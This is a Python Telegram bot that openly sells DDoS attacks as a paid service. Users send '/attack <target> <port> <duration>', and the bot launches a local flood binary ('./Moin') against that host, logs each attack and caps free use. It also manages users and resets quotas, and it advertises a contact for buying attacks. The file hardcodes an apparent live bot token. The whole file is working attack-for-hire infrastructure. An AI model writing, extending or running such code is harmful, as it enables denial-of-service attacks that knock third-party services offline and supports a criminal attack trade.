import telebot
import sqlite3
import asyncio
from datetime import datetime, timedelta

# Insert your Telegram bot token here
bot = telebot.TeleBot('7715609687:AAGNIrmJ1QgpsFWHqLuXG31ZuRGmfV3UEFM')

# Admin user IDs
ADMIN_IDS = ["7442822303"]

# Database setup
DB_FILE = "bot_data.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY, attack_count INTEGER DEFAULT 0, subscription_expiry DATETIME)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, target TEXT, port INTEGER, duration INTEGER, timestamp DATETIME)''')
    conn.commit()
    conn.close()

init_db()

# Constants
FREE_ATTACK_LIMIT = 10

# Helper Functions
def get_user_data(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT attack_count, subscription_expiry FROM users WHERE user_id = ?", (user_id,))
    user_data = c.fetchone()
    conn.close()
    return user_data

def update_user_attack_count(user_id, count):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET attack_count = ? WHERE user_id = ?", (count, user_id))
    conn.commit()
    conn.close()

def log_attack(user_id, target, port, duration):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, target, port, duration, timestamp) VALUES (?, ?, ?, ?, ?)",
              (user_id, target, port, duration, datetime.now()))
    conn.commit()
    conn.close()

def is_admin(user_id):
    return user_id in ADMIN_IDS

# Command Handlers
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    user_data = get_user_data(user_id)
    
    if user_data is None:
        bot.reply_to(message, "🚫 You are not authorized to use this bot.")
        return

    attack_count, subscription_expiry = user_data
    if attack_count >= FREE_ATTACK_LIMIT:
        bot.reply_to(message, "⚠️ You have reached your free attack limit. Please purchase tokens to continue.")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <target> <port> <duration>")
        return

    target, port, duration = command[1], int(command[2]), int(command[3])
    log_attack(user_id, target, port, duration)
    update_user_attack_count(user_id, attack_count + 1)
    
    asyncio.run(execute_attack(target, port, duration))
    bot.reply_to(message, f"🚀 Attack launched on {target}:{port} for {duration} seconds.")

async def execute_attack(target, port, duration):
    proc = await asyncio.create_subprocess_exec("./Moin", target, str(port), str(duration), "100")
    await proc.communicate()

@bot.message_handler(commands=['add'])
def handle_add_user(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /add <user_id>")
        return

    user_id = command[1]
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    try:
        c.execute("INSERT INTO users (user_id, attack_count, subscription_expiry) VALUES (?, ?, ?)", 
                  (user_id, 0, None))
        conn.commit()
        bot.reply_to(message, f"✅ User {user_id} added successfully.")
    except sqlite3.IntegrityError:
        bot.reply_to(message, "❌ User already exists.")
    finally:
        conn.close()

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return
    
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 10")
    logs = c.fetchall()
    conn.close()

    if logs:
        log_message = "\n".join([f"{log[4]} - {log[1]} attacked {log[2]}:{log[3]} for {log[4]} seconds" for log in logs])
        bot.reply_to(message, f"📝 Recent Logs:\n{log_message}")
    else:
        bot.reply_to(message, "⚠️ No logs available.")

@bot.message_handler(commands=['resetattacks'])
def handle_reset_attacks(message):
    if not is_admin(str(message.chat.id)):
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "⚠️ Usage: /resetattacks <user_id>")
        return

    user_id = command[1]
    update_user_attack_count(user_id, 0)
    bot.reply_to(message, f"✅ Attack count reset for user {user_id}.")

@bot.message_handler(commands=['start'])
def welcome_message(message):
    bot.reply_to(message, "❄️ Welcome to the Premium DDoS Bot. Use to view available commands 𝙔𝙊𝙐𝙍 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 /start\n/resetattacks\n/attack\n/add\n\n𝘿𝙈 -@Vip_Ddos_07 𝙏𝙊 𝘽𝙐𝙔 𝙋𝘼𝙄𝘿 𝘿𝘿𝙊𝙎 𝘼𝙇𝙇 𝘼𝙏𝙏𝘼𝘾𝙆 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 ✅\n MAKE SURE RESETATTACKS AFTER 10 ATTACK ")

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")